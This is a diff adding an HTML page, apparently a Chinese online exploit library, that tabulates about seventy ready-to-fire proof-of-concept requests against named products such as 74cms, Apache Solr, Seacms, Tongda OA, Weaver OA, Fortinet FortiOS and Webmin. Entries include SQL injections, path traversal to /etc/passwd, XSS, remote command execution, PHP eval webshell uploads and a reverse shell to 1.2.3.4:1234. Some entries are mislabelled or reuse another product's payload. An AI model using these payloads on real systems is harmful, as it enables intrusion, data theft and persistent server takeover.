@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+            <html lang="en">
+                <head>
+                    <meta charset="utf-8">
+                    <title>零组在线Bug库 -- Exp&poc数量:70</title>
+                    <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css"> 
+                    <link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.2.0/css/font-awesome.min.css"> 
+                    <script src="http://cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+                </head>
+                <style>
+                   
+                    table { 
+                    table-layout: fixed;
+                    word-wrap:break-word;
+                    }
+                </style>
+                <body>
+                    <table class="table table-hover" style="width:100%;hegiht:100%;">
+                        <thead>
+                            <tr>
+                              <th>Name</th>
+                              <th>Method</th>
+                              <th>Poc&Exp Route</th>
+                              <th>Post Parameter</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+<tr><td>74cms v4.2.126 Sql注入</td><td>GET</td><td>/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) -- a</td><td>Null</td></tr>
+<tr><td>74cms v4.2.3 任意文件删除</td><td>GET</td><td>/index.php?m=admin&c=database&a=del&name=/../../../../../</td><td>Null</td></tr>
+<tr><td>74cms v4.2.126 任意文件读取</td><td>POST</td><td>/index.php?m=Home&c=Members&a=register</td><td>reg_type=2&utype=2&org=bind&ucenter=bindcookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;</td></tr>
+<tr><td>Adobe ColdFusion 任意文件读取</td><td>GET</td><td>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</td><td>Null</td></tr>
+<tr><td>Apache Solr 远程命令执行</td><td>GET</td><td>/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</td><td>Null</td></tr>
+<tr><td>Apache FreeMarker 远程命令执行</td><td>POST</td><td>/ajax/email/template/preview</td><td>primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%40fusionauth.io&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}}</td></tr>
+<tr><td>CatfishCMS 4.6.15 xss</td><td>GET</td><td>/index.php/index/Index/pinglun</td><td>Null</td></tr>
+<tr><td>CatfishCMS 远程命令执行</td><td>POST</td><td>/application/config.php</td><td>s=whoami&_method=__construct&method=*&filter[]=system</td></tr>
+<tr><td>Cobub Razor 0.7.2 越权/td><td>POST</td><td>/index.php?/install/installation/createuserinfo</td><td>siteurl=http://127.0.0.1/&superuser=test&pwd=test123&verifypassword=test123&email=12@qq.com&submit=Submit request</td></tr>
+<tr><td>Cobub Razor 0.8.0 绝对路径泄露</td><td>POST</td><td>/index.php?/manage/channel/addchannel</td><td>channel_name=test"&platform=1</td></tr>
+<tr><td>Cobub Razor 0.8.0 Sql注入</td><td>POST</td><td>/index.php?/manage/channel/addchannel</td><td>channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1</td></tr>
+<tr><td>Computrols CBAS Web 用户枚举</td><td>POST</td><td>/cbas/index.php?m=auth&a=login</td><td>username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62</td></tr>
+<tr><td>Computrols CBAS Web Sql注入</td><td>GET</td><td>/index.php?m=servers&a=start_pulling&id=1 AND 2510 = 2510</td><td>Null</td></tr>
+<tr><td>Atlassian Confluence 命令执行</td><td>POST</td><td>/rest/tinymce/1/macro/preview</td><td>{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","w</td></tr>
+<tr><td>Coremail XT 配置文件泄露</td><td>GET</td><td>/mailsms/s?func=ADMIN:appState&dumpConfig=/</td><td>Null</td></tr>
+<tr><td>Couchcms 2.0 路径泄露</td><td>GET</td><td>/includes/mysql2i/mysql2i.func.php</td><td>Null</td></tr>
+<tr><td>Dedecms Xss</td><td>GET</td><td>/images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}//</td><td>Null</td></tr>
+<tr><td>Dedecms Getshell(后台)</td><td>GET</td><td>/dede/tpl.php?filename=caidao.lib.php&action=savetagfile&content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&token=2d7ef87e9828edaad2d7b6bbe37f1929</td><td>Null</td></tr>
+<tr><td>Discuz X3.4 任意文件删除</td><td>POST</td><td>/home.php?mod=spacecp&ac=profile&op=base</td><td>------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="formhash"[your formhash]------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="birthprovince"../robots.txt------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="profilesubmit"1------WebKitFormBoundaryPFvXyxL45f34L12s--</td></tr>
+<tr><td>Django Debug Page XSS</td><td>GET</td><td>:8000/create_user/?username=alert(1)</td><td>Null</td></tr>
+<tr><td>Django JSONField Sql注入</td><td>GET</td><td>/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'net user admin admin /add'--%20</td><td>Null</td></tr>
+<tr><td>Elasticsearch 未授权访问</td><td>GET</td><td>:9200/_river/_search</td><td>Null</td></tr>
+<tr><td>Emlog 6.0 xss</td><td>GET</td><td>/include/lib/js/uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//&.swf</td><td>Null</td></tr>
+<tr><td>Eyoucms 1.0 Getshell</td><td>POST</td><td>/index.php/api/Uploadify/preview</td><td>data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==</td></tr>
+<tr><td>Eyoucms 1.39 Sql注入</td><td>GET</td><td>/?ZXljbXM=1&a=index&c=Lists&m=home&tid=3&yanse=1</td><td>Null</td></tr>
+<tr><td>FasterXML 远程命令执行</td><td>GET</td><td>/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ==</td><td>Null</td></tr>
+<tr><td>Finecms 5.0.10 Getshell</td><td>GET</td><td>/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</td><td>Null</td></tr>
+<tr><td>Finecms SQL注入</td><td>GET</td><td>/index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select load_file(concat(0x5c5c5c5c,version(),0x2e6d7973716c2e61687a6935672e636579652e696f5c5c616263)))) as total</td><td>Null</td></tr>
+<tr><td>Fortinet FortiOS 路径遍历</td><td>GET</td><td>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</td><td>Null</td></tr>
+<tr><td>Fortinet FortiOS Xss</td><td>GET</td><td>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E</td><td>Null</td></tr>
+<tr><td>Imcat 4.4 敏感信息泄露</td><td>GET</td><td>/dev.php?tools-ipaddr&api=Pcoln&uip=137.36.58.213</td><td>Null</td></tr>
+<tr><td>Imcat 4.4 敏感信息泄露2</td><td>GET</td><td>/root/tools/adbug/binfo.php`</td><td>Null</td></tr>
+<tr><td>Maccms 8.x 命令执行</td><td>GET</td><td>/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}</td><td>Null</td></tr>
+<tr><td>新蜂商城 Sql注入</td><td>GET</td><td>/search?goodsCategoryId=&keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&orderBy=default</td><td>Null</td></tr>
+<tr><td>Nexus2 RCE</td><td>GET</td><td>/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}</td><td>Null</td></tr>
+<tr><td>OpenSNS v6.1.0 Sql注入</td><td>POST</td><td>/index.php?s=%2Fhome%2Faddons%2F_addons%2Fchina_city%2F_controller%2Fchina_city%2F_action%2Fgetcity.html</td><td>cid=0&pid%5B0%5D=%3D%28select%2Afrom%28select%2Bsleep%283%29union%2F%2A%2A%2Fselect%2B1%29a%29and+3+in+&pid%5B1%5D=3</td></tr>
+<tr><td>PbootCMS Sql注入</td><td>POST</td><td>/index.php/Message/add</td><td>contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111content = 1111 mobile = 1111</td></tr>
+<tr><td>Phpmyadmin 文件包含</td><td>GET</td><td>/index.php?target=db_sql.php%253f/../../../../../../phpStudy/使用说明.txt</td><td>Null</td></tr>
+<tr><td>PHPOK 5.3 Sql注入</td><td>GET</td><td>/api.php?c=index&f=phpok&token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&ext[sqlext]=sleep(5)%23&ext[site]=1</td><td>Null</td></tr>
+<tr><td>R&D Visions CMS Sql注入</td><td>GET</td><td>/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--+</td><td>Null</td></tr>
+<tr><td>rConfig 命令执行</td><td>POST</td><td>/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php</td><td>$sock=fsockopen("1.2.3.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");</td></tr>
+<tr><td>Seacms Xss</td><td>POST</td><td>/member.php?action=chgpwdsubmit</td><td>ldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com<scbase64ript src=https://url.cn/585l00F></scrbase64ipt>&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9</td></tr>
+<tr><td>Seacms Getshell</td><td>GET</td><td>/search.php?searchtype=5&tid=&area=eval($_POST[cmd])</td><td>Null</td></tr>
+<tr><td>Seacms V6.45 Getshell</td><td>POST</td><td>/search.php?searchtype=5</td><td>searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();</td></tr>
+<tr><td>Seacms V6.54 命令执行</td><td>POST</td><td>/search.php</td><td>searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();</td></tr>
+<tr><td>Seacms V9.1 Sql注入</td><td>GET</td><td>/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`</td><td>Null</td></tr>
+<tr><td>Seacms 9.92 Getshell</td><td>GET</td><td>/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E</td><td>Null</td></tr>
+<tr><td>Semcms v2.7 Sql注入</td><td>GET</td><td>/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&lgid=1 and if(length(database()>0),sleep(10),1) --+</td><td>Null</td></tr>
+<tr><td>Seacms 9.92 Getshell</td><td>POST</td><td>/123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&CF=Inquriy&page=</td><td>languageID=&AID%5B%5D=3</td></tr>
+<tr><td>Semcms V3.9 sql注入</td><td>POST</td><td>/Include/web_inc.php</td><td>languageID=0 or if(substr(database(),1,1) like 0x6D,sleep(5),1);</td></tr>
+<tr><td>Spring Cloud Config 2.1.0</td><td>GET</td><td>/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd</td><td>Null</td></tr>
+<tr><td>ThinkCMF Getshell</td><td>GET</td><td>/?a=fetch&templateFile=public/index&prefix=''&content=^php^file_put_contents('test.php','<^php phpinfo(); ?^')^/php^</td><td>Null</td></tr>
+<tr><td>UsualToolcms 任意文件删除</td><td>POST</td><td>/UsualToolCMS/myup.php</td><td>get=delimg&imgurl=./1.php</td></tr>
+<tr><td>VBulletin 5.1.4 命令执行</td><td>GET</td><td>/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D</td><td>Null</td></tr>
+<tr><td>Webmin 远程命令执行</td><td>POST</td><td>/password_change.cgi</td><td>user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2</td></tr>
+<tr><td>WordPress Plugin-Google Sql注入</td><td>GET</td><td>/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***&taction=edit</td><td>Null</td></tr>
+<tr><td>YouDianCMS 8.0 Sql注入</td><td>POST</td><td>/index.php/Member/Customer/saveModify</td><td>MemberName=xxxxx&MemberID='</td></tr>
+<tr><td>YzmCMS v3.6 Xss</td><td>GET</td><td>/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes</td><td>Null</td></tr>
+<tr><td>Zzzcms 1.75 xss</td><td>GET</td><td>/plugins/template/login.php?backurl=1%20onmouseover%3dalert(9516)%20y%3d</td><td>Null</td></tr>
+<tr><td>泛微OA Rce</td><td>GET</td><td>:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'</td><td>Null</td></tr>
+<tr><td>通达oa Getshell</td><td>GET</td><td>/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}</td><td>Null</td></tr>
+<tr><td>通达oa 敏感信息泄漏</td><td>GET</td><td>/general/get_userinfo.php</td><td>Null</td></tr>
+<tr><td>通达oa 越权</td><td>GET</td><td>/interface/ugo.php?OA_USER=admin</td><td>Null</td></tr>
+<tr><td>通达oa 文件包含</td><td>GET</td><td>/inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&include_file=../inc/js/menu_left.js</td><td>Null</td></tr>
+<tr><td>通达oa sql注入</td><td>GET</td><td>/general/mytable/intel_view/workflow.php?MAX_COUNT=15 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55&MODULE_ID=Math.random</td><td>Null</td></tr>
+<tr><td>致远OA Session泄漏</td><td>GET</td><td>/yyoa/ext/https/getSessionList.jsp</td><td>Null</td></tr>
+<tr><td>致远OA A6 Sql注入</td><td>GET</td><td>/yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notArc</td><td>Null</td></tr>
+<tr><td>致远OA A6 重置数据库账号密码</td><td>GET</td><td>/interface/ugo.php?OA_USER=admin</td><td>Null</td></tr>
+<tr><td>致远OA A6 信息泄露</td><td>GET</td><td>/yyoa/createMysql.jsp</td><td>Null</td></tr>
+<tr><td>禅道 8.2 getshell</td><td>GET</td><td>/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=base64</td><td>Null</td></tr>
